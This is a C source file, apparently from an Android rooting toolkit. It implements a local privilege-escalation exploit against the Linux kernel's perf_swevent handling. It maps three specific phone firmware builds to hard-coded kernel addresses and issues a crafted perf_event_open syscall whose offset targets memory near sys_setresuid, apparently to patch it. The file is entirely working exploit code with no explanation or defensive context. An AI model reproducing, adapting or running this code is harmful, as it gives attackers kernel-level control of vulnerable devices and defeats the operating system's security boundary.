#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <errno.h>
#include <device_database.h>

typedef struct _supported_device {
  device_id_t device_id;
  unsigned long int perf_swevent_enabled_address;
} supported_device;

static supported_device supported_devices[] = {
  { DEVICE_F11D_V24R40A,      0xc104cf1c },
  { DEVICE_IS17SH_01_00_04,   0xc0ecbebc },
  { DEVICE_ISW12K_010_0_3000, 0xc0db6244 },
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static unsigned long int
get_perf_swevent_enabled_address(void)
{
  int i;
  device_id_t device_id;

  device_id = detect_device();

  for (i = 0; i < n_supported_devices; i++) {
    if (supported_devices[i].device_id == device_id) {
      return supported_devices[i].perf_swevent_enabled_address;
    }
  }

  print_reason_device_not_supported();

  return 0;
}

static int fd;

static bool
syscall_perf_event_open(uint32_t offset)
{
  uint64_t buf[10] = { 0x4800000001, offset, 0, 0, 0, 0x300 };
  fd = syscall(__NR_perf_event_open, buf, 0, -1, -1, 0);

  return (fd > 0);
}

bool
break_with_perf_swevent(unsigned long int sys_setresuid_address)
{
  unsigned long int perf_swevent_enabled;
  int offset;

  perf_swevent_enabled = get_perf_swevent_enabled_address();
  if (!perf_swevent_enabled) {
    return false;
  }

  offset = (int)(sys_setresuid_address + 0x3c - perf_swevent_enabled) / 4;
  return syscall_perf_event_open(offset);
}

bool
restore_with_perf_swevent(unsigned long int sys_setresuid_address)
{
  if (fd > 0) {
    close(fd);
  }
  return true;
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
